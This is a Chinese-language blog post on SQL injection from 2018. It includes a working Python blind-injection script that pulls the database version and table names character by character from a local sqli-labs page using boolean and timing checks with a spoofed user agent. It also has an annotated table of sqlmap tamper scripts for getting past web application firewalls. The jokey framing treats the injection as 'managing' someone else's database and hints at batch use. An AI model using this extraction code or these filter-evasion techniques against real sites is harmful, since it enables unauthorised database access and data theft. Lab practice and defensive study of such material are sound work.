---
title: sql injection
date: 2018-04-06 20:19:18
tags: [security,sql]
---
SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.

SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐

# 我选择IE6
有比在IE里面上网冲浪更快乐的事情么?
<!--more-->

# 我选择自写脚本
自写脚本更能针对化的对应环境,对于白盒测试~~或者批量~~值得使用.
```python
# coding=utf-8
import string
import time
import requests
import fake_useragent


class Example:

    def __init__(self):
        self.get_table = """select group_concat(distinct table_name) from """ + \
                         """information_schema.columns where table_schema=database()"""
        self.get_database = """select database()"""
        self.get_version = """select @@version"""


def is_success_by_boolen(get_url):
    ua = fake_useragent.UserAgent()
    header = {"User-Agent": ua.random}
    r = requests.get(get_url, headers=header)
    success = "Your Login name"
    if success in r.text:
        return True
    else:
        return False


def is_success_by_time(get_url):
    ua = fake_useragent.UserAgent()
    header = {"User-Agent": ua.random}
    before_time = time.time()
    r = requests.get(get_url, headers=header)
    after_time = time.time()
    offset = after_time - before_time
    success = 8
    if success < offset:
        return True
    else:
        return False


def sql_fun(sql_fun):
    url = r"""http://localhost/sqlilabs/practice/example1.php?id=1' and ({0}) --+"""
    # Timing-based Blind SQL Attacks
    # url = r"""http://localhost/sqlilabs/practice/example1.php?id=1' and if(({0}),sleep(10),0) --+"""

    _long = -1
    out = ""
    for i in range(1, 9999, 1):
        sql = """LENGTH(({0}))={1}""".format(sql_fun, i)
        if is_success_by_boolen(url.format(sql)):
            _long = i
            break
        else:
            pass

    for i in range(1, _long, 1):
        for j in string.printable:#TODO: 二分法优化
            sql = """(substr(({0}),{1},1))=("{2}")""".format(sql_fun, i, j)
            if is_success_by_boolen(url.format(sql)):
                out += '' + j
                break
            else:
                pass
    return out


if __name__ == '__main__':
    print "{0}:  {1}".format(Example().get_version, sql_fun(Example().get_version))

```

# 我选择sqlmap

sqlmap内置有万能的脚本,对于黑盒测试值得使用.

脚本|直译|备注
--|--|--
apostrophemask|单引号伪装|使用*UTF-8*
apostrophenullencode|单引号null编码|用双字节的unicode字符
appendnullbyte|尾部添加null字节|
base64encode|base64编码
between|即*between*|替换 *<* *=* *>*
bluecoat|bypass Blue Coat Systems|老外的公司
chardoubleencode|字符两次编码|即两次url编码
charencode|...|
charunicodeencode|字符unicode编码|即 *%uxxxx* 编码
charunicodeescape|字符unicode转义|即 *\\uxxxx* 编码
commalessmid|mid更少的逗号|MID(A,B,C) --> MID(A FROM B FOR C)
commalesslimit|limit更少的逗号|LIMIT M, N --> LIMIT N OFFSET M
commentbeforeparentheses|括号之前注释|
concat2concatws|concat --> concat_ws|
equaltolike|*=* --> *like*|
escapequotes|转义引号|引号前面加 **\\\\**  (意义?)
greatest|GREATEST()|返回参数的最大值,用于替换*and*后的 *>*
halfversionedmorekeywords|_更多的关键字在一半的版本上_(?)|即加注释,如 */\*!0UNION*<br/>(MySQL < 5.1)
htmlencode|html编码|即 *&#xx;* 编码
ifnull2casewhenisnull|IFNULL() -->CASE WHEN ISNULL()|没见过的操作
ifnull2ifisnull|IFNULL()-->IF ISNULL()|...
informationschemacomment|information_schema注释|information_schema/**/.table
least|LEAST()|返回参数的最小值,用于替换*and*后的 *>*
lowercase|小写|
modsecurityversioned|_ModSecurity版本_(?)|开源的WAF
modsecurityzeroversioned|_ModSecurity零版本_(?)|..
multiplespaces|多个空格|就是瞎鸡儿加空格
nonrecursivereplacement|非递归替换|union --> uni**union**on
overlongutf8|超长的UTF-8|即 *%xx%xx* 编码(不转换字母)
overlongutf8more|更长的UTF-8|即 *%xx%xx* 编码...(转换字母)
percentage|百分号|select --> S%E%L%E%C%T
plus2concat| + --> CONCAT() |适用于(char(x)+char(x))
plus2fnconcat| + --> {fn CONCAT()}|ODBC only
randomcase|随机大小写|
randomcomments|随机注释|__/**/__
securesphere|SecureSphere|WAF
sp_password|sp_password|日志
space2*|spacee -> *
symboliclogical|逻辑符号|AND/OR -> &&/&Iota;&Iota;
unionalltounion|union all -> union|
unmagicquotes|魔术引号|即%bf%27,神奇的**縗'**
uppercase|大写|
varnish|Varnish|WAF
versionedkeywords|_版本的关键字_(?)|即/!*select/,不包括函数
versionedmorekeywords|_更多的版本的关键字_(?)|即/!*select/,包括函数
xforwardedfor|X-Forwarded-For|

# 我选择"啊D"
是...是大佬呢...

<!--小弟我对大佬你的景仰犹如滔滔江水连绵不绝又如黄河泛滥一发不可收拾天地可证日月可鉴。-->

# <p style="font-size:16px">参考链接:</p>

[Sql中操纵字符串的函数方法](https://mariadb.com/kb/en/library/string-functions/)

[SQLMap Tamper Scripts (SQL Injection and WAF bypass)](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)

